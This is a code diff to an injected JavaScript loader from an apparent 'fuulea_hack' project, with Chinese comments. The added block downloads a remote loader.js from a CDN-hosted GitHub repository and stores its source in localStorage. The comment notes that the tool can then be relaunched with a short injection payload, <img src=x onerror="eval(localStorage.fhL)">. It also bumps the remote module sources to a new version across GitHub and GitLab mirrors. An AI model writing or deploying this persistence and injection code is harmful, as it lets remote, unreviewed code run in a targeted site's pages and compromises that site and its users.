@@ -2,8 +2,23 @@
 (function () {
   if (document.getElementById('__fh')) return;
 
+  // 自缓存：第一次注入后，把自身源码存进 localStorage，
+  // 以后用 <img src=x onerror="eval(localStorage.fhL)"> 就能打开（45 字符）
+  (function () {
+    try {
+      if (localStorage.getItem('fhL')) return;
+      var x = new XMLHttpRequest();
+      x.open('GET', 'https://cdn.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@v1.6/loader.js', true);
+      x.timeout = 6000;
+      x.onload = function () {
+        if (x.status === 200) { try { localStorage.setItem('fhL', x.responseText); } catch (e) {} }
+      };
+      x.send();
+    } catch (e) {}
+  })();
+
   var MOD_BASES = [
-    'https://cdn.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@v1.5/',
+    'https://cdn.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@v1.6/',
     'https://raw.githubusercontent.com/zhaoqinhao123/fuulea_hack/main/',
     'https://gitlab.com/api/v4/projects/88544686/repository/files/'
   ];
